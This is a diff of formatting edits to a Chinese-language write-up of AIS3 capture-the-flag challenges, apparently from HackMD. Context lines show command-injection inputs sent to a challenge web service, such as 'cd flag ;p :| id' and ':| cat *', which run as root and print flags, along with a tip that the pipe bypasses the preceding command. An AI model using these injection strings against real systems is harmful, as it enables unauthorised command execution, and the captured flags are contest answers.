@@ -179,7 +179,9 @@ Connection: close
 
 #### 4. 💿 🚩 😜 😑 🆔 = Command: cd flag ;p :| id
 >uid=0(root) gid=0(root) groups=0(root)
->  :| 可以bypass ;p 多出來的p
+
+> [!TIP]
+> "|" 可以bypass | 前的指令，多出來的 p :
 
 ![image](https://hackmd.io/_uploads/BJUhJKxN0.png)
 #### 5. 💿 🚩 😜 😑 🐱 ⭐ = Command: cd flag ;p :| cat *
@@ -208,7 +210,7 @@ Connection: close
 {"command":"cd flag ;p :| python flag*","result":"AIS3{\ud83e\udef5\ud83e\udea1\ud83c\ude50\ud83e\udd19\ud83e\udd19\ud83e\udd19\ud83d\udc49\ud83d\udc49\ud83d\udea9\ud83d\udc48\ud83d\udc48}\n\n"}
 
 ```
->多餘了
+>想多了\
 >直接複製貼上就可
 
 ### Get FLAG
@@ -219,7 +221,7 @@ Connection: close
 ## Evil Calculator
 ![image](https://hackmd.io/_uploads/rkx0KeJN0.png)
 
-http://chals1.ais3.org:5001
+http://chals1.ais3.org:5001 \
 ![image](https://hackmd.io/_uploads/rknv9l14R.png)
 
 ### Evil Calculator Solution
@@ -348,24 +350,24 @@ if __name__ == '__main__':
 **FLAG: AIS3{7RiANG13_5NAK3_I5_50_3Vi1}**
 
 ## It's MyGO!!!!!
-![image](https://hackmd.io/_uploads/BJzOsWJEC.png)
-http://chals1.ais3.org:11454    
+![image](https://hackmd.io/_uploads/BJzOsWJEC.png)\
+http://chals1.ais3.org:11454 
 
 ![image](https://hackmd.io/_uploads/SJKqo-kV0.png)
 
-簡介:
-http://chals1.ais3.org:11454/#intro
-成員介紹:
-http://chals1.ais3.org:11454/#members
-原創曲:
+簡介:\
+http://chals1.ais3.org:11454/#intro \
+成員介紹:\
+http://chals1.ais3.org:11454/#members \
+原創曲:\
 http://chals1.ais3.org:11454/#songs
 
 ### It's MyGO!!!!! Solution
 原創曲: http://chals1.ais3.org:11454/#songs
 ![image](https://hackmd.io/_uploads/HytQa-y4A.png)
-> <<迷星叫>>: http://chals1.ais3.org:11454/song?id=1
-> <<迷路日々>>: http://chals1.ais3.org:11454/song?id=2
-> <<碧天伴走>>: http://chals1.ais3.org:11454/song?id=3
+> <<迷星叫>>: http://chals1.ais3.org:11454/song?id=1 \
+> <<迷路日々>>: http://chals1.ais3.org:11454/song?id=2 \
+> <<碧天伴走>>: http://chals1.ais3.org:11454/song?id=3 \
 > <<春日影>>: http://chals1.ais3.org:11454/song?id=4
     
 http://chals1.ais3.org:11454/song?id=5
@@ -639,8 +641,8 @@ print('讀取的flag:', flags)
 找到第62個字符: U+007d
 ```
 > 實在無解，開Ticket。
-> ![image](https://hackmd.io/_uploads/ryEm3IbER.png)
-> (ChatGPT)四個一組轉UTF-8
+> ![image](https://hackmd.io/_uploads/rJvEIFHNR.png)
+> (ChatGPT)四個一組轉UTF-8\
 > ![image](https://hackmd.io/_uploads/HydyaIW4R.png)
 
 ```
